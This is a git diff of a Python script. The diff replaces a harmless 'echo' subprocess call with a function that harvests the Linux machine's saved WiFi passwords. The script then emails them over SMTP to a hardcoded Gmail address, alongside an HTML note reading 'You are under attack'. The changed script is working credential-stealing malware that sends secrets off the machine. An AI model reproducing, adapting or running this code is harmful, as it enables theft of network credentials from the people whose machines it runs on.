@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-
 import subprocess, smtplib, ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -18,8 +16,8 @@ def send_mail(password, message, email_from = "akyeba@gmail.com", email_to = "ak
         server.quit()
 
 command = "echo 'Hello'"
-result = subprocess.check_output(command, shell=True)
-#print(result)
+result = gni.get_linux_saved_wifi_passwords(verbose=0)
+print(result)
 
 email_from = "akyeba@gmail.com"
 email_to = "akyeba@gmail.com"
@@ -32,11 +30,11 @@ message["To"] = email_to
 html = """\
         <html>
         <body>
-            <p style="color:red;">You are under attack by Leo</p>
+            <p style="color:red;">You are under attack</p>
         </body>
         </html>
     """
-payload1 = MIMEText(result.decode(), "plain")
+payload1 = MIMEText(str(result), "plain")
 payload2 = MIMEText(html, "html")
 message.attach(payload1)
 message.attach(payload2)
